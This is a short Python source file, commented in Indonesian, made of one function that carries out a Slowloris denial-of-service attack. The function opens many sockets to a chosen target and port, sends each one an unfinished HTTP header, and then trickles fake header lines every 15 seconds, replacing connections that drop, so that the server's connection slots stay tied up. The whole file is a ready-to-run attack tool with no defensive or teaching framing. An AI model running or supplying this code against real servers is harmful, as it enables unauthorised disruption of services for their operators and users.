import socket
import time
import logging
import random

log = logging.getLogger(__name__)

def attack(target, port, duration, connections=200):
    start_time = time.time()
    end_time = start_time + duration
    sockets_list = []

    # Buat header HTTP yang tidak lengkap
    request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
    request += f"Host: {target}\r\n"
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
    request += "Connection: keep-alive\r\n"  # Penting: keep-alive

    try:
        # Buat banyak socket
        for _ in range(connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)  # Timeout (penting)
                s.connect((target, port))
                s.send(request.encode())  # Kirim header yang tidak lengkap
                sockets_list.append(s)
            except socket.error as e:
                log.debug(f"Socket creation error: {e}")  # Debug, bukan error.
                continue # Lanjutkan, buat socket sebanyak mungkin

        # Kirim header tambahan secara perlahan
        while time.time() < end_time:
            for s in sockets_list:
                try:
                    # Kirim beberapa byte data tambahan (header palsu)
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except socket.error as e:
                    # Jika socket mati, hapus dari list
                    sockets_list.remove(s)
                    log.debug(f"Socket error (removing): {e}") # Debug, bukan error
                    # Coba buat socket baru untuk menggantikan yang mati
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.settimeout(4)
                        new_s.connect((target, port))
                        new_s.send(request.encode())
                        sockets_list.append(new_s)
                    except socket.error:
                        pass # Abaikan jika gagal
            time.sleep(15)  # Kirim data setiap 15 detik (bisa di-tweak)
    except KeyboardInterrupt:
        pass
    finally:
        # Tutup semua socket
        for s in sockets_list:
          if s:
            s.close()
        log.info("Slowloris attack finished.")